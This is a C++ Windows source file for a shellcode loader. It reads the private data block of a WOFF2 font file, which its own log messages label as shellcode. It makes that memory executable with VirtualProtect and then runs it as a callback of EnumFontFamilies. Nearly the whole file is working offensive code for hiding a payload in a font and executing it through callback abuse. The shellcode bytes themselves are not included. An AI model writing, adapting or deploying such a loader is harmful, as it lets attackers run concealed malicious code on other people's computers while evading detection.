#include <winsock2.h>
#include <Windows.h>
#include <wingdi.h>
#include <WinUser.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <cstdint>
#include <cstddef>
#include <iomanip>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ws2_32.lib")

using namespace std;

#pragma pack(push, 1)

struct WOFF2_Header {
  uint32_t signature;
  uint32_t flavor;
  uint32_t length;
  uint16_t numTables;
  uint16_t reserved;
  uint32_t totalSfntSize;
  uint32_t totalCompressedSize;
  uint16_t majorVersion;
  uint16_t minorVersion;
  uint32_t metaOffset;
  uint32_t metaLength;
  uint32_t metaOrigLength;
  uint32_t privOffset;
  uint32_t privLength;
};

#pragma pack(pop)

vector<BYTE> private_data_block;

BOOL CALLBACK EnumFamCallBack(LPLOGFONT lplf, LPNEWTEXTMETRIC lpntm, DWORD FontType, LPVOID aFontCount) {
    DWORD oldProtect;

    cout << "[+] Enter Callback" << endl;

    if (VirtualProtect(private_data_block.data(), private_data_block.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        auto entry = (void(*) ())private_data_block.data();
        
        entry();

        cout << "[+] Trigger received. Execute Payload..." << endl;
    }
    
    return TRUE;
}

BOOL read_private_data_block(string& woff2_file) {
  WOFF2_Header header;
  ifstream file(woff2_file, ios::binary | ios::ate);

  if (!file) {
    throw runtime_error("[!] Impossible to open the WOFF2 file");
    return FALSE;
  }

  streamsize size = file.tellg();

  file.seekg(0, ios::beg);

  if (!file.read(reinterpret_cast<char*>(&header), sizeof(WOFF2_Header))) {
    throw runtime_error("[!] Impossible to read the Header");
    return FALSE;
  }

  if (ntohl(header.signature) != 0x774f4632) {
    cerr << "[!] Bad magic\n";
    return FALSE;
  }

  file.seekg(ntohl(header.privOffset), ios::beg);
  if(!file) {
    throw runtime_error("[!] Invalid Offset");
    return FALSE;
  }

  private_data_block.resize(ntohl(header.privLength));
  printf("[i] Shellcode read at : %p\n", &private_data_block);

  if(!file.read(reinterpret_cast<char*>(private_data_block.data()), (int)ntohl(header.privLength))) {
    throw runtime_error("[!] Impossible to read private data block");
    return FALSE;
  }

  file.close();

  return TRUE;
}

int main (int argc, char *argv[]) {
  HDC hdc = GetDC(NULL);
  int aFontCount[] = { 0, 0, 0 };

  if (hdc == NULL) {
      cout << "[!] HDC Not Found !" << endl;
      return 1;
  }
  
  string filename = "test.woff2";

  read_private_data_block(filename);

  EnumFontFamilies(hdc, (LPCSTR)NULL, (FONTENUMPROC)EnumFamCallBack, (LPARAM)aFontCount);

  return 0;
}
